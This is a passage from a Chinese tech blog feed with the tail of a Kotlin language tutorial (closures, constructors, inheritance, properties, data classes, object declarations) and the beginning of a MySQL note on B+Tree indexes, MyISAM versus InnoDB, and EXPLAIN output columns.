<p>闭包可以简单理解为能够读取其他方法内部变量的方法。例如在JavaScript中，只有方法内部的子方法才能读取局部变量，所以闭包可以理解成“定义在一个方法内部的方法“。在本质上，闭包是将方法内部和方法外部连接起来的桥梁。</p>
<p>闭包的特性：</p>
<ul>
<li>方法可以作为另一个方法的返回值或者参数，<strong>还可以作为一个变量的值</strong></li>
<li>方法可以嵌套定义，即在一个方法内部可以定义另一个方法</li>
</ul>
<p>闭包的好处：</p>
<ul>
<li>加强模块化：闭包有益于模块化编程，它能以简单的方式开发较小的模块，提高开发速度和程序的可复用性</li>
<li>抽象：闭包是数据和行为的组合，这可以使得闭包具有较好的抽象能力</li>
<li>灵活：闭包的应用使得编程更加灵活</li>
<li>简化代码</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需求：实现一个接受一个testClosure方法，该方法要接受一个Int类型的v1参数，</span></span><br><span class="line"><span class="comment">// 同时能够返回一个声明为(v2: Int, (Int) -&gt; Unit)的函数，并且这个函数能够计算v1与v2的和</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">testClosure</span><span class="params">(v1: <span class="type">Int</span>)</span></span>: (v2: <span class="built_in">Int</span>, (<span class="built_in">Int</span>) -&gt; <span class="built_in">Unit</span>) -&gt; <span class="built_in">Unit</span> &#123;</span><br><span class="line">    println(<span class="string">&quot;第一层函数&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="title">fun</span><span class="params">(v2: <span class="type">Int</span>, printer: (<span class="type">Int</span>) -&gt; <span class="type">Unit</span>)</span></span> &#123;</span><br><span class="line">        printer(v1 + v2)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> testClosure = testClosure(<span class="number">2</span>)</span><br><span class="line">    testClosure(<span class="number">3</span>)&#123;</span><br><span class="line">        println(it)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解构声明"><a href="#解构声明" class="headerlink" title="解构声明"></a>解构声明</h2><p>指的是把对象解构成很多的变量</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = Result(<span class="string">&quot;success&quot;</span>, <span class="number">0</span>) </span><br><span class="line"><span class="comment">// 解构声明的语法</span></span><br><span class="line"><span class="keyword">val</span> (msg, code) = result </span><br><span class="line">println(<span class="string">&quot;msg:<span class="subst">$&#123;msg&#125;</span>&quot;</span>) </span><br><span class="line">println(<span class="string">&quot;code:<span class="subst">$&#123;code&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>很清晰的语法方式</p>
<h2 id="匿名方法"><a href="#匿名方法" class="headerlink" title="匿名方法"></a>匿名方法</h2><p>就是没有方法名的方法</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这种就是匿名方法</span></span><br><span class="line"><span class="function"><span class="title">fun</span><span class="params">(x: <span class="type">Int</span>, y: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> = x + y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">fun</span><span class="params">(x: <span class="type">Int</span>, y: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们在闭包的例子中返回的方法就是匿名方法</p>
<p>这就是一个简易的语法罢了</p>
<h2 id="方法的字面值"><a href="#方法的字面值" class="headerlink" title="方法的字面值"></a>方法的字面值</h2><p>我认为这个就是<strong>变量可以是一个方法</strong>的官方解释</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义了一个变量 tmp，而该变量的类型就是 (Int) -&gt; Boolean </span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">literal</span><span class="params">()</span></span> &#123; </span><br><span class="line">	<span class="keyword">var</span> tmp: ((<span class="built_in">Int</span>) -&gt; <span class="built_in">Boolean</span>)? = <span class="literal">null</span> </span><br><span class="line">    <span class="comment">// &#123; num -&gt; (num &gt; 10) &#125;即是一个方法字面值 </span></span><br><span class="line">    tmp = &#123; num -&gt; (num &gt; <span class="number">10</span>) &#125; </span><br><span class="line">    println(tmp(<span class="number">10</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到<code>tmp</code>变量，他的变量类型是什么？是方法！</p>
<h1 id="类与接口"><a href="#类与接口" class="headerlink" title="类与接口"></a>类与接口</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>在Kotlin中一个类可以有一个主构造方法和多个次构造方法</p>
<p>我们先看主构造方法</p>
<p>主构造方法是类头的一部分，跟在类名后面。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KotlinClass</span> <span class="keyword">constructor</span>(name: String) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果主构造方法没有任何注解或者可见性修饰符可以省去<code>constructor</code></p>
</blockquote>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KotlinClass</span> (name: String) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>主构造方法不能包含任何代码，初始化代码可以放到init关键字的初始化块中。</p>
<p>初始化块的顺序按照在类体中的顺序执行，和属于初始化器交织在一起</p>
</blockquote>
<p>声明属性的构造方法</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法的参数作为类的属性并赋值，</span></span><br><span class="line"><span class="comment">//KotlinClass2在初始化时它的name与score属性会被赋值 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KotlinClass2</span>(<span class="keyword">val</span> name: String, <span class="keyword">var</span> score: <span class="built_in">Int</span>) &#123; <span class="comment">/*……*/</span> &#125;</span><br></pre></td></tr></table></figure>

<p>次构造方法</p>
<p>我们可以在类体内通过<code>constructor</code>声明类的次构造方法</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KotlinClass</span> <span class="keyword">constructor</span>(name: String) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> views: MutableList&lt;View&gt; = mutableListOf()</span><br><span class="line">    <span class="keyword">constructor</span>(view: View, name: String) : <span class="keyword">this</span>(name) &#123;</span><br><span class="line">        views.add(view)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类有主构方法的时候，每个次构造方法都要委托给主构造方法处理</p>
<p>初始化代码块中的代码是主构造方法的一部分，所以初始化代码会在次构造方法执行前执行【<code>init</code>代码块】</p>
<h2 id="继承与覆盖"><a href="#继承与覆盖" class="headerlink" title="继承与覆盖"></a>继承与覆盖</h2><p>和Java不同，Kotlin中所有类都默认为<code>final</code>，如果他需要被继承，我们需要使用<code>open</code>声明</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打开继承</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">Animal</span>(age:<span class="built_in">Int</span>) &#123;</span><br><span class="line">    <span class="keyword">init</span> &#123;</span><br><span class="line">        println(age)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在Kotlin中所有类都有共同的超类<code>Any</code>，<code>Any</code>有三个方法<code>equals()</code>,<code>hashCode()</code>,<code>toString()</code></p>
</blockquote>
<p>在Kotlin中继承用:如需继承一个类，请在类头中把超类放到冒号之后：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//派生类有柱构造方法的情况 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(age: <span class="built_in">Int</span>) : Animal(age)</span><br></pre></td></tr></table></figure>

<p> 如果派生类有一个主构造方法，其基类必须用派生类主构造方法的参数初始化。 </p>
<p>如果派生类没有主构造方法，那么每个次构造方法必须使用 <code>super </code>关键字初始化其基类型。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//派生类无柱构造方法的情况 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> : <span class="type">Animal</span> &#123; </span><br><span class="line">    <span class="keyword">constructor</span>(age: <span class="built_in">Int</span>) : <span class="keyword">super</span>(age) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>覆盖规则</p>
<p>主要是两种，覆盖方法和覆盖属性</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打开继承</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">Animal</span>(age:<span class="built_in">Int</span>) &#123;</span><br><span class="line">    <span class="comment">// 属性允许被覆盖</span></span><br><span class="line">    <span class="keyword">open</span> <span class="keyword">val</span> foot = <span class="number">0</span></span><br><span class="line">    <span class="keyword">init</span> &#123;</span><br><span class="line">        println(age)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(age: <span class="built_in">Int</span>) : Animal(age) &#123;</span><br><span class="line">    <span class="comment">//覆盖属性</span></span><br><span class="line">    <span class="keyword">override</span> <span class="keyword">val</span> foot = <span class="number">4</span></span><br><span class="line">    <span class="comment">// 覆盖方法</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，无论是属性还是方法都是在类中不允许被覆盖的</p>
<p>必须显式的声明这些可以被覆盖，子类中也必须说明我们覆盖了这些</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>属性的声明</p>
<p>Kotlin类的属性可以用关键字var声明可变，也可以用关键字val声明为可读的</p>
<p><code>Getters</code>与<code>Setters</code></p>
<p>声明一个属性的完整语法是</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> &lt;propertyName&gt;[: &lt;PropertyType&gt;] [= &lt;property_initializer&gt;] </span><br><span class="line">	[&lt;getter&gt;] </span><br><span class="line">	[&lt;setter&gt;]</span><br></pre></td></tr></table></figure>

<p>其中初始器，<code>getter</code>，<code>setter</code>都是可选的。</p>
<p>如果属性类型可以从初始器（或者<code>getter</code>）中推断出来，可以省略属性类型</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(age: <span class="built_in">Int</span>) : Animal(age) &#123;</span><br><span class="line">    <span class="keyword">var</span> simple: <span class="built_in">Int</span>?</span><br><span class="line">        <span class="keyword">get</span>() &#123;</span><br><span class="line">            println(<span class="string">&quot;get&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span>(value) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//覆盖属性</span></span><br><span class="line">    <span class="keyword">override</span> <span class="keyword">val</span> foot = <span class="number">4</span></span><br><span class="line">    <span class="comment">// 覆盖方法</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span> &#123;</span><br><span class="line">        println(<span class="string">&quot;simple：<span class="subst">$&#123;simple&#125;</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> dog = Dog(<span class="number">2</span>)</span><br><span class="line">    dog.eat()</span><br><span class="line">    println(<span class="string">&quot;==============&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> simple = dog.simple</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//----------运行结果------------</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    2</span></span><br><span class="line"><span class="comment">    get</span></span><br><span class="line"><span class="comment">    simple：1</span></span><br><span class="line"><span class="comment">    ==============</span></span><br><span class="line"><span class="comment">    get</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>我们需要知道<code>getter</code>和<code>setter</code>的特点</p>
<blockquote>
<p>定义了<code>getter</code>，每次访问属性的时候都会调用它</p>
<p>定义了<code>setter</code>，每次赋值都会调用它</p>
</blockquote>
<p>延迟初始化属性</p>
<p>通常属性声明为非空类型必须在构造方法中初始化。</p>
<p>然后这不利于依赖注入来初始化或者单元测试的<code>setup</code>方法初始化</p>
<p>为了处理这种情况，可以使用<code>lateinit</code>来延迟初始化</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">Shop</span>(<span class="keyword">val</span> name: String, <span class="keyword">val</span> location: String)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">lateinit</span> <span class="keyword">var</span> shop: Shop</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">setup</span><span class="params">()</span></span> &#123;</span><br><span class="line">        shop = Shop(<span class="string">&quot;杂货铺&quot;</span>, <span class="string">&quot;深圳&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(::shop.isInitialized) &#123;</span><br><span class="line">            println(shop.location)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这种延迟初始化方式中，我们在未初始化的情况下去访问属性的时候会抛出异常</p>
<p>我们可以通过属性的<code>if(::shop.isInitialized)</code>来检测</p>
<h2 id="抽象类与接口"><a href="#抽象类与接口" class="headerlink" title="抽象类与接口"></a>抽象类与接口</h2><p>抽象类</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Printer</span> &#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">fun</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FilePrinter</span> : <span class="type">Printer</span>() &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">print</span><span class="params">()</span></span> &#123;</span><br><span class="line">        TODO(<span class="string">&quot;Not yet implemented&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口</p>
<p>Kotlin中的接口即可包含抽象方法的声明，也可包含实现。</p>
<p>与抽象类不同的是，接口无法保存状态，它可以由属性，但是必须把声明为抽象或提供访问器实现</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Study</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> time :<span class="built_in">Int</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">address</span><span class="params">()</span></span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">earningCourses</span><span class="params">()</span></span> &#123;</span><br><span class="line">        println(<span class="string">&quot;架构师&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StudyAs</span>(<span class="keyword">override</span> <span class="keyword">var</span> time: <span class="built_in">Int</span>) : Study&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">address</span><span class="params">()</span></span> &#123;</span><br><span class="line">        TODO(<span class="string">&quot;Not yet implemented&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h2><p>数据类指的是我们只保存数据的一些类</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">Address</span>(<span class="keyword">val</span> name: String, <span class="keyword">val</span> number: <span class="built_in">Int</span>) &#123; </span><br><span class="line">    <span class="keyword">var</span> city: String = <span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">print</span><span class="params">()</span></span> &#123; </span><br><span class="line">        println(city) </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数据类的要求：</p>
<p>主构造方法需要至少一个参数</p>
<p>主构造方法都需要标记为<code>val var</code></p>
<h2 id="对象表达式与对象声明"><a href="#对象表达式与对象声明" class="headerlink" title="对象表达式与对象声明"></a>对象表达式与对象声明</h2><p>在<code>Kotlin</code>提供对象表达式来方面我们需要对一个类轻微改动并创建它的对象，而不是为之显式声明新的子类。</p>
<p>对象表达式</p>
<p>要创建一个继承自某个类型的匿名类的对象，我们会这么写：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">Address2</span>(name: String) &#123;</span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">print</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shop2</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> address: Address2? = <span class="literal">null</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">addAddress</span><span class="params">(address: <span class="type">Address2</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">test3</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Shop2().addAddress(<span class="keyword">object</span> :Address2(<span class="string">&quot;Android&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">print</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.print()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>匿名对象可以用作只在本地和私有作用域中声明的类型</p>
<p>对象声明是指我们把<code>class</code>变为<code>object</code>，变成了对象声明</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span> DataUtil &#123; </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">isEmpty</span><span class="params">(list: <span class="type">ArrayList</span>?)</span></span>: <span class="built_in">Boolean</span> &#123; </span><br><span class="line">        <span class="keyword">return</span> list?.isEmpty() ?: <span class="literal">false</span> </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">testDataUtil</span><span class="params">()</span></span> &#123; </span><br><span class="line">    <span class="keyword">val</span> list = arrayListOf(<span class="string">&quot;1&quot;</span>) 					println(DataUtil.isEmpty(list)) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意看，这里是我们使用<code>object</code>来使得这个变为静态的</p>
<p>我们调用方法不用实例化</p>
]]></content>
  </entry>
  <entry>
    <title>性能调优-Mysql</title>
    <url>/2021/03/29/2021/%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98-Mysql/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/03/aUeom4JIjB6VkZQ.jpg"
                      alt="Screenshot_23.jpg"
                ></p>
<h1 id="Mysql索引数据结构"><a href="#Mysql索引数据结构" class="headerlink" title="Mysql索引数据结构"></a>Mysql索引数据结构</h1><h2 id="索引结构"><a href="#索引结构" class="headerlink" title="索引结构"></a>索引结构</h2><p>一般的索引结构开始被认为是</p>
<ul>
<li>二叉树</li>
<li>红黑树</li>
<li>Hash表</li>
<li>B-Tree</li>
</ul>
<h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><p>二叉树一般用平衡二叉树作为索引结点，但是可能出现这样的情况</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/29/TAqPR25NMlYpnkB.jpg"
                      alt="Screenshot_12.jpg"
                ></p>
<p>这样磁盘IO的次数在大量数据的情况下会很多。显而易见不是很好</p>
<h3 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h3><p>红黑树会自旋，不会出现二叉树这样在一条路上走到黑的情况。那么红黑树有什么缺点呢？</p>
<p>可以看到在大容量的数据下，磁盘IO的次数是树的高度。而二叉树每个节点只有一个数据。</p>
<p>可以试想千万级的数据下，二叉树的高度为log2(千万)，大概二十次左右，也就是需要进行二十次的磁盘IO。</p>
<p>【我觉得这个量级还行，但是工程上肯定是还有更好的</p>
<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>Hash表指的对索引按照哈希算法得到对应的空间</p>
<p>显然使用Hash索引可以很快的得到对应的文件，这是它最大的优点。</p>
<p>但是为什么不使用Hash表索引呢？</p>
<p>无法范围查找 </p>
<h3 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B-Tree"></a>B-Tree</h3><p>B树的优点在于每一个节点有多个数据，而不是想上面的一样，一个节点只有一个数据。</p>
<p>总的来说B-Tree就是帮助节点横向延申了，但还是可以继续优化的【前辈们真是厉害啊 </p>
<p>这时候就出现了B+ 树。为了更加的大</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/30/ED6OMvyeVrBm58z.jpg"
                      alt="Screenshot_13.jpg"
                ></p>
<p>【那个红色字体没写完–</p>
<p>总的来说 一个节点可以存放 16KB&#x2F;14B &#x3D; 1170个小整体</p>
<p>那么按图上说的 最后有多少个节点？ 1170*1170 个大节点</p>
<p>而大节点中存放的数据有多少个？ 假设一份数据大小为1kb，则大节点中有16个数据。</p>
<p>对应的 上图可以有1170 x 1170  x 16 &#x3D;2.1千万。</p>
<p>这样来看，千万级数据，高度为三就可以，也就是说，只需要进行三次磁盘IO就可以查到元素。</p>
<p>【谨记 磁盘IO的速度绝对比内存的运算慢</p>
<p> <strong>B+Tree 底部指针</strong></p>
<p>B+Tree 在常规数据结构的时候，是单向指针，但是在Mysql中对底层做了优化，变成了双向指针</p>
<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p>常见的MyISAM  innoDB</p>
<p><strong>小常识</strong> </p>
<p>存储引擎是对表而言  也就是说 库里面不同表可以用不同的存储引擎</p>
<p>表和索引文件存储在<code>C:\Program Files\MYSQL\mysql-8.0.17-winx64\data\</code>下</p>
<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><p><code>表的结构 .frm | 表中存储的数据行 .MYD | 索引字段 .MYI</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/30/hbZNkTncFDmCytO.jpg"
                      alt="Screenshot_14.jpg"
                ></p>
<p>索引和数据分开，称之为非聚集索引</p>
<h3 id="innoDB"><a href="#innoDB" class="headerlink" title="innoDB"></a>innoDB</h3><p><code>表结构 .frm  数据+索引 .ibd</code></p>
<p>innoDB是聚集索引，它的索引和数据是在一个文件里面的</p>
<p>innoDB设计的就是需要一个B+Tree来组织好文件，毕竟<code>.ibd</code>是把索引和数据和在一起了</p>
<p>表数据文件本身就是按B+Tree组织的一个索引结构文件</p>
<p>聚集索引-叶节点包含了完整的数据记录</p>
<blockquote>
<p><strong>为什么InnoDB表必须有主键，并且推荐使用整型的自增主键？</strong></p>
</blockquote>
<p>这是个好问题</p>
<p>首先 innoDB的设计就是需要有索引-数据配合在一个文件里面的，这样才能构成B+树</p>
<p>那么 如果你没有手动设置主键，Mysql可能在innoDB中找了一列作为唯一索引</p>
<p>如果没有一列可以被认为是唯一索引，那么会在末尾建立一列 <code>Rowid</code>，以这列作为索引</p>
<p>当然这个是不会显示出来的</p>
<p>此外用整形是为了占用内存少，比较速度快</p>
<p>而自增是因为 如果不自增的话，你插入到中间，可能会触发B+树的分裂和自增</p>
<blockquote>
<p><strong>为什么非主键索引结构叶子节点存储的是主键值？(一致性和节省存储空间)</strong></p>
</blockquote>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/30/64PTkpCwJSabt1x.jpg"
                      alt="Screenshot_15.jpg"
                ></p>
<p>如果各自索引文件存数据，可能出现事务问题，即索引一数据没改动  索引二数据改动了 【注意 索引树都在<code>ibd</code>文件中</p>
<p>所以维护一致性原则，可以把数据统一放在主键索引处。</p>
<p>这也就是为什么非主键索引叶子节点存储的是主键值。</p>
<p>当然这也可以节省空间，但是我觉得更加重要的是一致性问题</p>
<blockquote>
<p>联合索引</p>
</blockquote>
<p>联合索引当然要看到其底层结构（id,name,data）</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/30/rBZ9GNvzeXS5uPy.jpg"
                      alt="Screenshot_16.jpg"
                ></p>
<p>联合索引还是有本质特点，排好序的。</p>
<p>可以看到下面这个排序是使用索引最左前缀原理的方式</p>
<h1 id="Mysql执行计划与索引详解"><a href="#Mysql执行计划与索引详解" class="headerlink" title="Mysql执行计划与索引详解"></a>Mysql执行计划与索引详解</h1><p>注意：一个表定然会有主键索引，但是除了主键索引之外，可以有其他的索引，只是其他索引的叶子节点的值是主键</p>
<h2 id="Explain工具介绍"><a href="#Explain工具介绍" class="headerlink" title="Explain工具介绍"></a>Explain工具介绍</h2><p>使用EXPLAIN关键字可以模拟优化器执行SQL语句，分析你的查询语句或是结构的性能瓶颈 在 select 语句之前增加 explain 关键字，MySQL 会在查询上设置一个标记，执行查询会返 回执行计划的信息，而不是执行这条SQL 注意：如果 from 中包含子查询，仍会执行该子查询，将结果放入临时表中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM m_user WHERE ID = 1 </span><br></pre></td></tr></table></figure>

<p>可以看到：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/31/Bu1q2WniQShZoOe.jpg"
                      alt="Screenshot_17.jpg"
                >可以看到对应的一些列</p>
<p>下面分析一下对应的列的信息表示什么？</p>
<h3 id="explain中的列"><a href="#explain中的列" class="headerlink" title="explain中的列"></a><strong>explain中的列</strong></h3><p><strong>1. id列</strong> </p>
<p>id列的编号是 select 的序列号，有几个 select 就有几个id，并且id的顺序是按select 出现的顺序增长的。 </p>
<p>id列越大执行优先级越高，id相同则从上往下执行，id为NULL最后执行。 </p>
<p>这里显示了ID的作用 越大优先级越高 同等大小 则从上往下执行</p>
<p><strong>2. select_type列</strong> </p>
<p>select_type 表示对应行是简单还是复杂的查询</p>
<p>1）simple：简单查询。查询不包含子查询和union </p>
<p>2）primary：复杂查询中最外层的 select</p>
<p>3）subquery：包含在 select 中的子查询（不在 from 子句中） </p>
<p>4）derived：包含在 from 子句中的子查询。MySQL会将结果存放在一个临时表中，也称为派生表（derived的英文含义） </p>
<p><strong>3. table列</strong> </p>
<p>这一列表示 explain 的一行正在访问哪个表。 </p>
<p>当 from 子句中有子查询时，table列是<code>&lt;derivenN&gt;</code>格式，表示当前查询依赖 id&#x3D;N 的查 询，于是先执行 id&#x3D;N 的查询。 </p>
<p>当有 union 时，UNION RESULT 的 table 列的值为&lt;union1,2&gt;，1和2表示参与 union 的 select 行id。</p>
<p><strong>4. type列</strong> </p>
<p>这一列表示关联类型或访问类型，即MySQL决定如何查找表中的行，查找数据行记录的大概范围。 </p>
<p>依次从最优到最差分别为：<strong>system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt; ALL</strong> </p>
<p>一般来说，得保证查询达到range级别，最好达到ref </p>
<p>NULL：mysql能够在优化阶段分解查询语句，在执行阶段用不着再访问表或索引。例如：在索引列中选取最小值，可以单独查找索引来完成，不需要在执行时访问表 </p>
<p>mysql&gt; explain select min(id) from film;</p>
<p><strong>const, system</strong>：mysql能对查询的某部分进行优化并将其转化成一个常量（可以看show warnings 的结果）。用于 primary key 或 unique key 的所有列与常数比较时，所以表最多有一个匹配行，读取1次，速度比较快。system是const的特例，表里只有一条元组匹配时为system </p>
<p><strong>eq_ref</strong>：primary key 或 unique key 索引的所有部分被连接使用 ，最多只会返回一条符合条件的记录。这可能是在 const 之外最好的联接类型了，简单的 select 查询不会出现这种type。 </p>
